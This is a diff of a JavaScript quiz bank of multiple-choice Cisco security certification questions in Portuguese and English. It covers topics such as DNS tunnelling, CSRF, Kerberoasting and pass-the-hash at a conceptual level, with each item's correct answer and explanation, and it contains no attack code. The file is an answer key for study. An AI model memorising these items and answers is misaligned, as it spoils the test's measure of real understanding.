+          "Tunneling DNS",
+          "STP root guard",
+          "Port security sticky MAC",
+          "LLDP-MED"
+        ],
+        "correct": 0,
+        "explanation": "O tunneling DNS codifica dados em consultas/respostas DNS, muitas vezes permitidas pelas firewalls, para C2 ou exfiltração.",
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "6.5"
+      },
+      {
+        "question": "O que fornecem sobretudo em conjunto o Cisco XDR e plataformas SIEM/SOAR estilo Splunk?",
+        "options": [
+          "Deteção entre domínios",
+          "Apenas gestão de cabos na maioria dos ambientes de produção",
+          "Apenas orçamentação PoE",
+          "Apenas planeamento de canais Wi-Fi"
+        ],
+        "correct": 0,
+        "explanation": "O XDR correlaciona telemetria de vários domínios; plataformas SIEM/SOAR como o Splunk acrescentam pesquisa, conteúdo de deteção e resposta automatizada.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "6.6"
+      },
+      {
+        "question": "Num desenho zero-trust, o que verifica sobretudo o Cisco Duo Device Trust?",
+        "options": [
+          "Que o dispositivo que autentica é um endpoint gerido e saudável",
+          "Que o cabo Ethernet é Cat6 quando não existem outros controlos",
+          "Que o monitor suporta 4K em parques de vários fabricantes",
+          "Que a cadeira tem apoio lombar quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O Duo Device Trust verifica o estado de saúde/gestão do dispositivo como parte das decisões de acesso adaptativo numa arquitetura zero-trust.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
+      },
+      {
+        "question": "O que ajuda o Duo Trust Monitor as equipas de segurança a notar?",
+        "options": [
+          "Padrões de autenticação invulgares que podem indicar tomada de conta",
+          "A temperatura do UPS em redes empresariais típicas segundo a prática comum",
+          "O comprimento dos troços de fibra sem ferramentas adicionais",
+          "O número de painéis de patch na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "O Trust Monitor destaca autenticações anómalas (nova localização, viagem impossível, novo dispositivo) que podem assinalar compromisso de conta.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
+      },
+      {
+        "question": "Como ajuda o Splunk a gerir e automatizar eventos de segurança num SOC alinhado com SCOR?",
+        "options": [
+          "Pesquisar, correlacionar e despoletar ações de resposta sobre dados de segurança à escala",
+          "Substituir todas as firewalls por consultas de pesquisa no dia a dia das operações",
+          "Atribuir áreas OSPF sem ferramentas adicionais quando não existem outros controlos",
+          "Configurar apenas EtherChannel quando não existem outros controlos em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "O Splunk ingere e pesquisa dados de segurança à escala e, com SOAR/automação, pode despoletar ações de resposta a partir das deteções.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "6.8"
+      },
+      {
+        "question": "Que problema relacionado com OWASP envolve enganar o browser do utilizador para fazer pedidos autenticados indesejados?",
+        "options": [
+          "Cross-site request forgery (CSRF)",
+          "Apenas injeção de SQL",
+          "ARP spoofing segundo a prática comum",
+          "Ataque STP na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "O CSRF abusa da sessão autenticada do browser para o browser da vítima enviar pedidos indesejados que alteram estado.",
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Que controlo reduz melhor os cliques bem-sucedidos em phishing?",
+        "options": [
+          "Formação de sensibilização mais MFA e defesa contra ameaças de email",
+          "Desativar todo o email em redes empresariais típicas na maioria dos ambientes de produção",
+          "Remover o DNS sem ferramentas adicionais no dia a dia das operações",
+          "Desligar todos os registos durante janelas de manutenção de rotina"
+        ],
+        "correct": 0,
+        "explanation": "Os controlos anti-phishing em camadas combinam formação de sensibilização, MFA (limita o impacto da reutilização de credenciais) e filtragem de segurança de email.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.4"
+      },
+      {
+        "question": "O que permite sobretudo a partilha de security intelligence entre organizações?",
+        "options": [
+          "Reconhecer mais depressa indicadores maus conhecidos entre pares",
+          "Ciclos de atualização mais lentos quando não existem outros controlos",
+          "Partilhas administrativas abertas no dia a dia das operações",
+          "TLS desativado no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "Partilhar threat intelligence (IoCs, TTPs) permite aos pares bloquear e detetar atividade má conhecida mais depressa do que trabalhando isolados.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "1.7"
+      },
+      {
+        "question": "O que ajusta sobretudo o Duo Adaptive Access com base em sinais de risco?",
+        "options": [
+          "Os requisitos de autenticação",
+          "A prioridade de root do STP",
+          "O temporizador hello do OSPF",
+          "A classe de potência PoE segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "As políticas de Adaptive Access sobem ou descem a força da autenticação (ou negam) com base em sinais de risco como novo dispositivo ou localização invulgar.",
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
+      },
+      {
+        "question": "Para que serve o Cisco Security Cloud Control na gestão de equipamentos de segurança?",
+        "options": [
+          "Gestão centralizada na cloud de vários equipamentos e políticas de segurança",
+          "Apenas desenhar diagramas de racks sem ferramentas adicionais",
+          "Apenas vender cabos quando não existem outros controlos durante janelas de manutenção de rotina",
+          "Apenas configurar modems analógicos sem ferramentas adicionais"
+        ],
+        "correct": 0,
+        "explanation": "O Security Cloud Control (antigo CDO) fornece gestão centralizada na cloud de vários equipamentos de segurança Cisco.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.4"
+      },
+      {
+        "question": "Porque é o HTTPS um canal comum de exfiltração?",
+        "options": [
+          "É amplamente permitido e o payload cifrado esconde o conteúdo de inspeção simples",
+          "É sempre bloqueado por omissão quando não existem outros controlos",
+          "Não consegue transportar ficheiros na maioria dos ambientes de produção",
+          "Só funciona em impressoras quando não existem outros controlos segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "O HTTPS é normalmente permitido de saída e a cifra oculta o que está a ser transferido, salvo haver inspeção TLS ou DLP no endpoint.",
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "6.5"
       }
     ],
     "en": [
@@ -18449,7 +21350,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "The CIA triad is Confidentiality, Integrity, and Availability. Confidentiality protects who can see information; Integrity protects against unauthorized changes; Availability ensures access when needed.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
       },
       {
         "question": "An email urgently asks you to click a link and “verify your Cisco account” by entering your password. What type of social-engineering attack is this?",
@@ -18461,7 +21365,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Phishing uses fraudulent messages to trick victims into revealing credentials or installing malware. Spear phishing is the highly personalized variant. It is not brute force, physical-layer MITM, or DDoS.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "What is the main difference between a packet-filtering firewall and an IDS/IPS?",
@@ -18473,7 +21380,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Firewalls control what passes based on policy. IDS monitors and alerts; IPS sits inline and can drop malicious traffic. They complement AAA rather than replace it.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "firewall-vpn",
+        "domain": "2.5"
       },
       {
         "question": "In the AAA model used in Cisco networks, what do Authentication, Authorization, and Accounting mean?",
@@ -18485,7 +21395,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "AAA: Authentication verifies identity; Authorization defines permissions/policies; Accounting records sessions and usage (audit/billing). Common protocols: RADIUS and TACACS+.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
       },
       {
         "question": "For VPNs, which statement best describes IPsec compared with SSL/TLS VPN (e.g., browser-based or AnyConnect SSL mode)?",
@@ -18497,7 +21410,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "IPsec (AH/ESP, IKE) protects IP traffic and is classic for site-to-site VPNs. SSL/TLS VPNs encapsulate user sessions and are common for remote access. Both can coexist depending on the use case.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.6"
       },
       {
         "question": "Which description correctly matches ransomware?",
@@ -18509,7 +21425,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Ransomware encrypts data and demands ransom. Related malware types include viruses, worms, trojans, spyware, and rootkits. Mitigations: offline backups, patching, MFA, email filtering, and least privilege.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "What is Zero Trust, in terms of network security principles?",
@@ -18521,7 +21440,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Zero Trust assumes the internal network is not an automatic trust zone. It requires strong authentication, contextual authorization, microsegmentation, and continuous verification (never trust, always verify).",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "1.8"
       },
       {
         "question": "In the Cisco security ecosystem, what is the typical role of Cisco ISE (Identity Services Engine) versus a unified XDR/visibility platform such as SecureX (or successors)?",
@@ -18533,7 +21455,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Cisco ISE is the AAA/NAC policy engine (802.1X, profiling, posture, guest). SecureX-class platforms integrate alerts and workflows across firewall, endpoint, email, and more. They complement each other in Cisco security architecture.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "What is the fundamental difference between hashing and symmetric encryption?",
@@ -18545,7 +21470,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Hashes (SHA-256, etc.) are not reversed to recover the original — they support integrity and verification. Symmetric encryption (AES) encrypts and decrypts with the same key. Asymmetric crypto uses public/private key pairs.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
       },
       {
         "question": "Why does multi-factor authentication (MFA) significantly reduce account-compromise risk?",
@@ -18557,7 +21485,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "MFA combines factors (knowledge, possession, inherence). Even with a leaked password, the attacker still needs the second factor. It is essential in Zero Trust and for privileged Cisco access — and it does not replace patching or firewalls.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
       },
       {
         "question": "What is defense in depth in a network environment?",
@@ -18569,7 +21500,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Defense in depth stacks complementary controls: firewalls, segmentation, AAA/MFA, EDR, encryption, and monitoring. It reduces the impact of any single failure.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
       },
       {
         "question": "What is the main cybersecurity benefit of network segmentation (e.g., VLANs, firewalls between zones)?",
@@ -18581,7 +21515,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Segmentation (and microsegmentation) restricts east-west traffic. It isolates IoT/guest from management and data centers, aligned with Zero Trust and least privilege.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
       },
       {
         "question": "What is the primary purpose of a SIEM (Security Information and Event Management) platform?",
@@ -18593,7 +21530,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "A SIEM aggregates logs and security events (firewalls, endpoints, identity, cloud, etc.), normalizes and correlates them, and helps analysts detect, alert on, and investigate incidents. It does not replace AV with a packet broker, does not act as a public CA for TLS, and cannot promise zero false positives by blindly blocking DNS.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
       },
       {
         "question": "In cybersecurity, what is the MITRE ATT&CK framework mainly used for?",
@@ -18605,7 +21545,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "MITRE ATT&CK catalogs real-world adversary tactics (the “why”) and techniques (the “how”), often with procedure examples. Defenders use it to gap-analyze coverage, write detections, and discuss incidents consistently. It is not ASA CLI documentation, not a cipher that replaces AES, and not a cabling standard.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
       },
       {
         "question": "What does a Web Application Firewall (WAF) primarily protect against?",
@@ -18617,7 +21560,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "A WAF sits in front of web applications and inspects HTTP/S traffic to block or challenge common app-layer attacks such as SQL injection, cross-site scripting, and known bad request patterns. It does not fix physical cable cuts, OSPF LSDB sizing, or UPS batteries.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.2"
       },
       {
         "question": "What is the primary purpose of DNSSEC?",
@@ -18629,7 +21575,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "DNSSEC adds digital signatures (RRSIG and DNSKEY records, chained with DS records in the parent) so a validating resolver can confirm that the data came from the authoritative zone and was not modified. Query confidentiality comes from DoT or DoH, not from DNSSEC. It does not replace email authentication or endpoint protection.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
       },
       {
         "question": "Working together, what do SPF, DKIM, and DMARC do for email security?",
@@ -18641,7 +21590,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "SPF authorizes sending hosts in a DNS TXT record. DKIM signs selected headers and the body with a domain key published in DNS. DMARC requires the visible From domain to align with SPF and/or DKIM and publishes a policy (none, quarantine, or reject) plus reporting. Together they fight domain spoofing; they do not encrypt the message and they do not replace SMTP TLS.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "5.7"
       },
       {
         "question": "What is the main difference between EDR and XDR?",
@@ -18653,7 +21605,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "EDR (Endpoint Detection and Response) collects telemetry and supports response on endpoints. XDR (Extended Detection and Response) extends detection and response across control points, correlating endpoint data with network, email, cloud, and identity. Cisco XDR is an example of that broader model. Neither one, by itself, replaces the firewall or disk encryption.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "What is a SOAR platform mainly used for?",
@@ -18665,7 +21620,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "SOAR (orchestration, automation, and response) runs playbooks: enrich alerts, open cases, isolate hosts, block indicators, and notify teams. It complements a SIEM, which detects and stores events, rather than replacing routing or SPAN.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.2"
       },
       {
         "question": "In a security operations team, what is threat hunting?",
@@ -18677,7 +21635,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Threat hunting assumes some intrusions evade alerts. Hunters form a hypothesis (for example a technique from ATT&CK), query endpoint, network, or identity data, and turn findings into new detections. It complements SIEM and EDR; it does not replace prevention and it does not mean ignoring alerts.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.3"
       },
       {
         "question": "What is the main difference between an Indicator of Compromise (IoC) and an Indicator of Attack (IoA)?",
@@ -18689,7 +21650,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "IoCs are observable artifacts tied to known badness after or during compromise (malware hashes, C2 IPs/domains, filenames). IoAs emphasize attacker behaviors and techniques (e.g., unusual PowerShell, credential dumping patterns) so defenders can detect activity earlier and more resiliently when attackers change infrastructure. They are not badge/wireless concepts, not CVE/CVSS substitutes, and not synonymous ACL lines.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.3"
       },
       {
         "question": "In a breach scenario, what does “lateral movement” usually mean?",
@@ -18701,7 +21665,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Lateral movement is the post-compromise phase where adversaries hop between hosts and escalate or reuse credentials (RDP, SMB, Pass-the-Hash, remote management tools, etc.) to broaden foothold and reach crown jewels. It is not physical rack relocation, certificate rotation policy alone, or ISP failover.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "What is a CASB (Cloud Access Security Broker) primarily used for?",
@@ -18713,7 +21680,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "A Cloud Access Security Broker is a control point (API-based, reverse/forward proxy, or both) that applies enterprise security policy to cloud app usage: discover shadow IT, enforce DLP/access controls, and detect threats in SaaS/IaaS contexts. It is not a core-switch replacement, not a CVSS engine fed by NetFlow alone, and not an MPLS PE substitute.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.3"
       },
       {
         "question": "How does Business Email Compromise (BEC) typically differ from classic mass phishing?",
@@ -18725,7 +21695,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "BEC is typically a focused fraud: attackers impersonate a CEO, finance lead, or trusted vendor and push a wire-transfer or data change without necessarily dropping malware. Classic phishing casts a wide net to steal passwords or deliver payloads. BEC is not defined as zero-day-only, ransomware-of-mailboxes, or limited to Gmail vs AD.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.7"
       },
       {
         "question": "What is the primary goal of Data Loss Prevention (DLP) controls?",
@@ -18737,7 +21710,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "DLP policies identify sensitive content and enforce rules on email, web, endpoints, or cloud apps so regulated or secret data is not exfiltrated casually. It complements—not replaces—firewalls and AV. It is not backup compression and not daily MAC randomization.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.4"
       },
       {
         "question": "What does Network Detection and Response (NDR) primarily focus on?",
@@ -18749,7 +21725,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "NDR tools watch network behavior—flows, sessions, sometimes full packets—to spot C2, lateral movement, and anomalies, then help analysts respond. That is broader than monthly patch scans, ITSM ticket hygiene alone, or DNS encryption (DoH/DoT), which are different controls.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.1"
       },
       {
         "question": "What does UEBA (User and Entity Behavior Analytics) mainly look for?",
@@ -18761,7 +21740,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "UEBA builds behavioral baselines for users and entities (hosts, service accounts) and flags anomalous activity that may indicate account takeover, insider threat, or lateral movement. It is not a CVE scoring feed, not an excuse to open firewalls to any-any, and not about discarding identity context from logs.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.11"
       },
       {
         "question": "What is “shadow IT” in an enterprise security context?",
@@ -18773,7 +21755,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Shadow IT is the use of applications, SaaS, or infrastructure without IT/security approval—creating visibility, compliance, and data-leak gaps. It is not the official CMDB, not a lobby badge drill, and not a maintenance dark-fiber path.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "3.3"
       },
       {
         "question": "What is an MFA fatigue (MFA bombing) attack trying to achieve?",
@@ -18785,7 +21770,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "MFA fatigue/bombing overwhelms the legitimate user with authentication prompts so they eventually accept one, handing the attacker an authenticated session after credential theft or password spray. It is not about open guest SSIDs as the mechanism, ICMP-only TLS downgrade, or clearing BGP communities.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
       },
       {
         "question": "What does a basic container escape mean for a host running Docker/Kubernetes workloads?",
@@ -18797,7 +21785,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "A container escape is when code inside a container breaks isolation (namespaces/cgroups/capabilities/misconfig) and reaches the host OS or sibling workloads. It is not a harmless DHCP renew, not a claim that every Pod becomes a Type-1 VM, and not merely renaming a Docker bridge.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.7"
       },
       {
         "question": "What problem does certificate (public-key) pinning mainly try to reduce in a mobile or thick client app?",
@@ -18809,7 +21800,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Certificate pinning (or public-key pinning) teaches the client to expect a specific cert or key (or small set), so a TLS proxy presenting a different CA-signed cert is more likely to fail. It does not err-disable switch ports, replace DNS with hosts files, or embed passwords in certificate CNs.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "cripto",
+        "domain": "2.10"
       },
       {
         "question": "What does microsegmentation mainly aim to control for east-west traffic inside a data center or cloud VPC?",
@@ -18821,7 +21815,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Microsegmentation applies identity- or label-based controls between workloads so a breach in one app tier cannot freely reach others (east-west). It complements, not replaces, perimeter controls. It is not about flattening all tenants onto one VLAN, disabling encryption for taps, or using obsolete dial-up/token-ring paths.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.4"
       },
       {
         "question": "What does a living-off-the-land (LOLBins) technique mainly rely on during an intrusion?",
@@ -18833,7 +21830,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Living-off-the-land abuses legitimate, preinstalled binaries and scripts so malicious actions blend with admin activity and may evade simple file-hash AV. It is not defined by USB kernel drivers alone, DNS/NTP pranks, or a magic SNMP write that opens the whole internet.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
       },
       {
         "question": "In a software supply-chain compromise (SolarWinds-style), what trust relationship is the attacker mainly abusing?",
@@ -18845,7 +21845,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Supply-chain attacks target the trust customers place in vendor updates or CI/CD artifacts—malware is injected upstream and delivered as “legitimate” software. Guest Wi-Fi portals, coffee-machine Bluetooth, and lobby fax lines are not the defining abuse path for this class of attack.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "What is the main security purpose of deploying honeypots or broader deception technology?",
@@ -18857,7 +21860,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Honeypots/deception present fake assets or tokens that legitimate users rarely touch; interaction is a strong signal of hostile activity and can delay or distract attackers. They do not open firewalls any-any, store passwords in cleartext, or disable DC logging.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
       },
       {
         "question": "Why do attackers sometimes abuse DNS tunneling for command-and-control or data exfiltration?",
@@ -18869,7 +21875,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "DNS tunneling encodes data in DNS queries/answers; many networks permit DNS outbound, so it can bypass controls that block other protocols. DNS is not inherently TLS-encrypted end-to-end for all queries, does not replace BGP/OSPF, and does not wipe AD accounts.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "6.5"
       },
       {
         "question": "In disaster recovery planning, how do RTO and RPO mainly differ?",
@@ -18881,7 +21890,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Recovery Time Objective (RTO) limits how long a service may stay down; Recovery Point Objective (RPO) limits how much data you can afford to lose, expressed as time before the incident. They are not tape brands, OSPF timers, or phishing/firewall housekeeping metrics.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.4"
       },
       {
         "question": "In a Windows Active Directory environment, what does a pass-the-hash (PtH) attack mainly reuse?",
@@ -18893,7 +21905,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Pass-the-hash reuses captured NTLM (or related) hashes to authenticate without cracking the cleartext password. It is not limited to one typed cleartext password, and it is not a BGP or rogue-DHCP technique.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "What is the main security purpose of planting canary tokens (or similar honeytokens) in files, URLs, or credentials?",
@@ -18905,7 +21920,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Canary tokens / honeytokens are decoy artifacts that should not be used in normal work; access triggers a strong signal of probing or theft. They do not replace SIEM, encrypt disks by themselves, or disable MFA.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "2.3"
       },
       {
         "question": "What does an air-gapped system mainly rely on for isolation from remote network threats?",
@@ -18917,7 +21935,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Air-gapping isolates a system by keeping it off untrusted networks (physically or with extreme controls), reducing remote malware and C2 paths. Open cloud exposure, always-on Internet IPsec, or joining corporate Wi-Fi while disabling defenses contradicts that isolation goal.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
       },
       {
         "question": "How do red team, blue team, and purple team roles mainly differ in a security exercise?",
@@ -18929,7 +21950,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Red teams emulate adversaries (offense). Blue teams protect, detect, and respond (defense). Purple teaming bridges them so attack techniques and detections improve together. The other options reverse or invent duties and wrongly treat the labels as identical SOC tiers.",
-        "difficulty": "Easy"
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
       },
       {
         "question": "What is the main difference between consuming threat intelligence feeds and doing threat hunting?",
@@ -18941,7 +21965,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Threat intelligence feeds supply IOCs/TTPs/context that tools and analysts can use. Threat hunting is a proactive search through telemetry for suspicious activity that alerting may have missed. Hunting often uses intel, but it is not the same as passively ingesting feeds; neither activity is limited to patch lists, printers, or HR checks.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.3"
       },
       {
         "question": "What does a Kerberoasting attack mainly try to obtain in an Active Directory environment?",
@@ -18953,7 +21980,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Kerberoasting requests Kerberos service tickets (TGS) for accounts with SPNs, extracts the encrypted material, and cracks it offline to recover service-account passwords—often highly privileged. It is not about DHCP helper spoofing for VPN PSKs, WPA3 SAE golden MDM certs, or emptying BGP TCP-AO keychains for SSH roots.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "What does an NTLM relay attack mainly try to abuse in a Windows environment?",
@@ -18965,7 +21995,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "NTLM relay intercepts a legitimate NTLM authentication and reuses it against a different target (often when signing or channel-binding protections are weak). It is not AS-REP roasting, not EAP-TLS flooding of RADIUS, and not a local SMB performance tweak.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.5"
       },
       {
         "question": "How does password spraying mainly differ from a classic online brute-force attack against one account?",
@@ -18977,7 +22010,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Password spraying spreads a few likely passwords across many users to stay under account-lockout thresholds; classic online brute force focuses many guesses on one account. It is not limited to SSH keys, does not need DC console access, and is not Kerberoasting.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "In Active Directory attacks, what does a successful DCSync mainly allow an adversary to do?",
@@ -18989,7 +22025,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "DCSync abuses directory replication privileges (often after stealing high-privilege credentials) to request account secrets/hashes as if the attacker were a DC. It is not about swapping GPO MSI packages, turning off Kerberos forest-wide, or rewriting SPNs into public DNS CNAMEs.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "In malware analysis, what does “sandbox detonation” mainly mean?",
